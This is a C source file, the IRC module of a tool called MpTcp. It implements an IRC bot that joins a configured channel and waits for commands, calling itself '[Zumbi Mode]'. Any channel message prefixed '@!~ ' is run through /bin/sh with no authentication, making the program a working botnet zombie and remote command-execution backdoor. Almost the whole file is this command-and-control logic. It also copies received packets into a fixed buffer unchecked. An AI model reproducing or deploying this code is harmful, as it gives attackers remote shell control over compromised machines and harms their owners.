/*......,,,,,,,.............................................................
*
* @@NAME:     Module IRC
* @@VERSION:  1.0.2
* @@DESC:     IRC source file (this file is part of MpTcp tool).
* @@AUTHOR:   Felipe Ecker (Khun) <khun@hexcodes.org>
* @@DATE:     16/11/2012 22:45:00
* @@MANIFEST:
*      Copyright (C) Felipe Ecker 2003-2013.
*      You should have received a copy of the GNU General Public License 
*      inside this program. Licensed under GPL 3
*      If not, write to me an e-mail please. Thank you.
*
*...........................................................................
*/

#include "../include/core.h"

static struct __data _data;   /* Sender bulk */
uint32 stream;
#define IRC_BUFF 2048
uchar __ircbuffer[IRC_BUFF];

struct buffered {
   uchar buffer[IRC_BUFF];
   uint16 size;
} __packed__;

/* The PROCESS hell looping (Running on a dedicated threading) */
#if !defined(WEAK_GCC)
__hot__ inline static void *__process( void *__raw ) {
#else
inline static void *__process( void *__raw ) {
#endif

   register struct buffered *__irc = (struct buffered *) __raw;
   register uint16 size = __irc->size;
   register uchar *data = __irc->buffer;
   register uchar *__buff = (uchar *) calloc(1, IRC_BUFF);
   register uchar *__mem = __buff;

   /* Closing Link engine */
   /* Pattern: 45-52-52-4F-52 */
   if ( (*data++ == 0x45) && (*data++ == 0x52) && (*data++ == 0x52) &&
   (*data++ == 0x4F) && (*data++ == 0x52) && (*data++ == 0x20) && 
   (*data++ == 0x3A) ) {
      log("[Server connection close].\n");
      kill(getpid(), SIGALRM);
        goto __EXIT;
   } else data = __irc->buffer;

   auto char __send[2048];
   register uint16 it;
   register uint16 limit = 6;

   memcpy(__buff, "PONG :", 6);
   __buff += 6;

   char *__syscmd = (char *) __buff;

   /* PING PONG engine */ 
   /* Pattern: "PING :" = 50-49-4E-47-20-3A */
   /* Pattern: "PONG :" = 50-4F-4E-47-20-3A */
   for (it = 0; it < size; it++) {

      if ( (*data++ == 0x50) && (*data++ == 0x49) && (*data++ == 0x4E) &&
      (*data++ == 0x47) && (*data++ == 0x20) && (*data++ == 0x3A) ) {
         do { 
            *__buff++ = *data; 
            limit++; 
         } while( (*data++ != 0x0A) && (limit < 48) );

         send(stream, __mem, limit, 0);
         break;
      }

      /* Main exec engine */
      /* Pattern: "@!~" = 40-21-7E-20 */
      if ( (*data++ == 0x40) && (*data++ == 0x21) && (*data++ == 0x7E) &&
      (*data++ == 0x20) ) {
         while( (*data != 0x0D) && (limit < IRC_BUFF) ) { 
            *__buff++ = *data++; 
           limit++;
         }

         snprintf(__send, sizeof(__send) - 1, 
         "PRIVMSG #%s :[Running] %s\r\n", pkt->ircRoom, __syscmd);
         send(stream, __send, strlen(__send), 0);

         show("\n\n[IRC] Running: %s\n\n", __syscmd);
         signal(SIGCHLD, SIG_IGN);
         if ( !fork() ) execl("/bin/sh", "sh", "-c" , __syscmd, NULL);
         break;
      }
   }

   __EXIT:
   if (__mem) free(__mem);
   return NULL;
}


#if defined(__BSD_SYSTEM__)
static void __bsd_listen (  u_char *args,
                            const struct pcap_pkthdr *hdr,
                            const u_char *recvbuff )
{

   /* auto struct ether_header *h = (struct ether_header *) recvbuff; */
   auto struct ip *ip      = (struct ip *) (recvbuff + SIZE_ETH);
   auto struct tcphdr *tcp = (struct tcphdr *) (recvbuff + SIZE_ETH+ SIZE_IP);

   if ( hardtrue((ip->ip_p != IPPROTO_TCP) ||
      (ip->ip_src.s_addr != _data.target->sin_addr.s_addr) || 
      (ntohs(tcp->th_sport) != pkt->port)) )
         goto __ROLLING;

   struct buffered irc;
   register uint8 size_hdr = SIZE_ETH + SIZE_IP + SIZE_TCP + SIZE_AUX;
   register uchar *data = (uchar *) (recvbuff + size_hdr);

   irc.size = ntohs(ip->ip_len) - (SIZE_IP + SIZE_TCP + SIZE_AUX);
   memcpy(irc.buffer, data, irc.size);
   __process((void *) &irc);

   __ROLLING:
   pass;
}
#endif


#if !defined(WEAK_GCC)
__hot__ inline static void *__packets_handler() {
#else
inline static void *__packets_handler() {
#endif

#if defined(__BSD_SYSTEM__)
   auto char *eth, err_buff[PCAP_ERRBUF_SIZE];

   if ( !(eth = pcap_lookupdev(err_buff)) ) {
      log("ERROR on grab system's interface. Exiting..\n\n");
      kill(getpid(), SIGALRM);
      goto __ENDING;
   }

   if ( !(__session = pcap_open_live(eth, IRC_BUFF, true, 1, err_buff)) ) {
      log("Couldn't open device %s: Detail: %s\n", eth, err_buff);
      kill(getpid(), SIGALRM);
      goto __ENDING;
   }

   pcap_loop(__session, -1, __bsd_listen, NULL);

#else
   register uint32 sock;
   /* TCP RAW socket */
   if ( !( sock = __socketPool(false, __TCP_MODE__, false)) ) return NULL;

   struct buffered irc;
   register uint8 size_hdr = SIZE_IP + SIZE_TCP + SIZE_AUX;

   register uchar *recvbuff = __ircbuffer;
   register uint16 size = IRC_BUFF;
   auto struct sockaddr_in remote;
   socklen_t _sizeof = sizeof(struct sockaddr_in);

   register struct iphdr *recvip = (struct iphdr *) recvbuff;
   register struct tcphdr *recvtcp = (struct tcphdr *) (recvbuff + SIZE_IP);
   register uchar *data = (uchar *) (recvbuff + size_hdr);

   __LOOP:
   if ( hardfalse(recvfrom(sock, recvbuff, size, 0, \
   (struct sockaddr *) &remote, &_sizeof) < 0) ) {
      log("ERROR on received IRC PINPONG data.\n\n");
      kill(getpid(), SIGALRM);
      goto __ENDING;
   }

   
   if ((recvip->protocol != IPPROTO_TCP) ||
      (recvip->saddr != _data.target->sin_addr.s_addr) ||
      (ntohs(recvtcp->source) != pkt->port)) goto __LOOP;

   irc.size = ntohs(recvip->tot_len) - size_hdr;
   memcpy(irc.buffer, data, irc.size);

   /* I'll threading each received packet. 
   I dont care about the spending processing time. */
   if ( !__threadPool(1, &__process, (void *) &irc) ) return NULL;
   goto __LOOP;

#endif
   __ENDING:
   return NULL;
}


#if !defined(WEAK_GCC)
__hot__ inline static bool __doCheck( const uint8 _sleep, 
                                      const bool verifyPacket ) {
#else
inline static bool __doCheck( const uint8 _sleep, 
                              const bool verifyPacket ) {
#endif

   auto struct timeval _times;
   auto fd_set beep;
   _times.tv_sec = _sleep;
   _times.tv_usec = 2000;
   FD_ZERO(&beep);
   FD_SET(stream, &beep);

   __RETRY:
   if ( !select(stream+1, &beep, NULL, NULL, &_times)) goto __TIMEOUT;
   recv(stream, __ircbuffer, IRC_BUFF, 0);

   if ( hardfalse(verifyPacket) ) {
      if ( hardfalse(strstr((char *) __ircbuffer, ":End of /NAMES list")) )
          return true;
      else goto __RETRY;
   } else return true;

   __TIMEOUT:
   return false;
}


inline static void __run( void ) {

   /* TCP STREAM socket */
   if ( !( stream = __socketPool(false, __TCP_MODE__, true)) ) return;
   __set_nonblock(stream);

   register uint8 tsize = sizeof(struct sockaddr);
   register struct sockaddr_in *targ = _data.target;

   auto struct timeval _times;
   auto fd_set beep, wr;
   _times.tv_sec = 5;
   _times.tv_usec = 0;
   FD_ZERO(&beep);
   FD_ZERO(&wr);
   FD_SET(stream, &beep);
   FD_SET(stream, &wr);

   show("[IRC] Connecting to server (%s) on port %d..\n", pkt->dst,pkt->port);
   connect(stream, (struct sockaddr *) targ, tsize);

   if ( select(stream+1, &beep, &wr, NULL, &_times) != 1) {
      log("Unable to connect on IRC server. Offline or closed port ??\n");
      kill(getpid(), SIGALRM);
      return;
   } else {
      show("[Done]\n\n");
      close(stream);
   }


   show("[IRC] Now logging on channel (#%s)...\n", pkt->ircRoom);
   sleep(2);

   /* TCP STREAM socket */
   if ( !( stream = __socketPool(false, __TCP_MODE__, true)) ) return;

   if ( !__threadPool(1, &__packets_handler, NULL)) return;
   sleep(1);

   connect(stream, (struct sockaddr *) targ, tsize);
   if (!__doCheck(20, false)) {
      log("Unable to loggin on server. Maybe it has a slow connection.\n");
      kill(getpid(), SIGALRM);
      return;
   }
   sleep(2);

   auto char auth[512];
   register uint32 ident = rand() % 0xFFFFFFFF;
   snprintf(auth, sizeof(auth) - 1, "NICK M-%08X\n\rUSER MPTCP-%04X MPTCP-%04X %s :MPTCP\n\r",
   ident, ident, ident, pkt->dst);

   send(stream, auth, strlen(auth), 0);
   if (!__doCheck(30, false)){
      log("Unable to logging on server. Maybe it has a slow connection.\n");
      kill(getpid(), SIGALRM);
      return;
   }

   sleep(5);
   uint8 retry = 3;
   snprintf(auth, sizeof(auth) - 1, "JOIN #%s %s\n\r",
   pkt->ircRoom, pkt->ircPass);

   __RETRY:
   send(stream, auth, strlen(auth), 0);
   if (!__doCheck(12, true)) {
      if (retry--) goto __RETRY;
      else {
         log("Unable to connect on channel #%s. Try again..\n", pkt->ircRoom);
         kill(getpid(), SIGALRM);
         return;
      }
   }

   show("[Done]\n\n");
   show("[Zumbi Mode] Waiting for commands:\n");
   sleep(16070400); /* Time to Live: ~6 months. */
}


bool irc( const char **pull __unused__ ) {

   signal(SIGINT, __sigcatch);
   signal(SIGALRM, __sigcatch);

   static char addressbuff[sizeof(struct sockaddr_in)] __nocommon__;
   _data.target = (struct sockaddr_in *) addressbuff;
   if (!__lookup(_data.target, pkt->dst, pkt->port, false)) return false;

   __run();
   return true;
}

